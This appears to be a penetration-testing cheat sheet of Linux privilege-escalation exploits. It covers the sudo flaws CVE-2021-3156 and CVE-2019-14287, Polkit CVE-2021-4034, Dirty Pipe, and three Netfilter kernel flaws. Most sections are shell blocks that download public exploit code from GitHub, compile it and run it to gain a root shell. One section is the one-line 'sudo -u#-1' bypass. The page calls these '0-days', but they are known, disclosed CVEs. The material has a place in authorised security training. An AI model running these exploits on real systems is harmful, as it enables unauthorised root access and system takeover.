# Recent 0-days

### Sudo

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

* 1.8.31 - Ubuntu 20.04
* 1.8.27 - Debian 10
* 1.9.2 - Fedora 33
* and others

```shellscript
# Check sudo version 
sudo -V

# Prepare the exploit
git clone <https://github.com/blasty/CVE-2021-3156.git>
cd CVE-2021-3156
make

# Get the help for the exploit 
./sudo-hax-me-a-sandwich

# Find out which OS system we are dealing with
cat /etc/lsb-release

# Run the correct exploit 
./sudo-hax-me-a-sandwich <ID>
```

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```shellscript
# Check that our user can run any command as sudo
sudo -l

sudo -u#-1 <COMMAND_ALLOWED>
```

### Polkit

{% embed url="https://github.com/arthepsy/CVE-2021-4034" %}

```shellscript
# Prepare exploit 
git clone <https://github.com/arthepsy/CVE-2021-4034.git>
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

sudo apt-get install musl-tools
musl-gcc cve-2021-4034-poc.c -o poc

# Run exploit 
./poc
```

### Dirty Pipe

All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability

{% embed url="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" %}

```shellscript
# Prepare exploit
git clone <https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git>
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# Check the kernel version
uname -r

# After compiling, we have exploit-1, which gives us a root shell 
# exploit-2 lets us run any SUID binary as root

# Exploit 1 
./exploit-1

# Exploit 2
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```

### Netfilter

#### CVE-2021-22555

Vulnerable kernel versions: 2.6 - 5.11

```shellscript
# Check kernel version
uname -r

# Exploit 
wget <https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c>
gcc -m32 -static exploit.c -o exploit
./exploit
```

#### CVE-2022-25636

Linux kernel 5.4 through 5.6.10

```shellscript
# Check kernel version
uname -r

# Exploit
git clone <https://github.com/Bonfee/CVE-2022-25636.git>
cd CVE-2022-25636
make
./exploit
```

#### CVE-2023-32233

vulnerability in the Linux Kernel up to version `6.3.1`

```shellscript
# Check kernel version
uname -r

# Exploit
git clone <https://github.com/Liuk3r/CVE-2023-32233>
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```
